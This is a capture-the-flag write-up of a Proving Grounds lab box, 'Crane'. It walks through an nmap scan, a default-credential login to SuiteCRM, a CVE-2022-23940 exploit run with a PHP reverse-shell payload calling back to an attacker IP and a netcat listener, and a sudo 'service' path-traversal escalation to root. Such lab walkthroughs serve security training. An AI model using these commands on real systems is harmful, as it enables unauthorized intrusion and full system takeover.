---
layout: default
title: Crane
parent: Proving Grounds Practice - Linux
nav_order: 15
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/crane]                                                      └─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.192.146

Nmap scan report for 192.168.192.146
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry
|_/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
```

# Enumeration

---

## 80 | HTTP

Appears to be SugarCRM site.

![index](../../../assets/images/ctfs/proving_grounds/crane/index.png)

Attempting LFI led to "bad data page" and a link to "crane.offsec".

Upadated _/etc/hosts_

Attempted SQLi; dead end

Default credentails admin:admin login.

Check version history in "About"

![version](../../../assets/images/ctfs/proving_grounds/crane/version.png)

Searching for "SuiteCRM 7.12.3" leads to 'https://github.com/manuelz120/CVE-2022-23940' exploit.

# Exploitation

---

Downloaded the exploit and executed and received reverse shell on netcat listener per the instructions at https://github.com/manuelz120/CVE-2022-23940.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/crane]
└─$ python3 exploit.py -h http://crane.offsec -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.217\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report


┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.192.146] 47542
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Check Sudo Permissions

We can run _/usr/bin/service_ and gain a root shell.

```bash
www-data@crane:/home$ sudo -l
sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
www-data@crane:/home$ sudo /usr/sbin/service ../../../bin/bash
sudo /usr/sbin/service ../../../bin/bash
root@crane:/# id
id
uid=0(root) gid=0(root) groups=0(root)

```
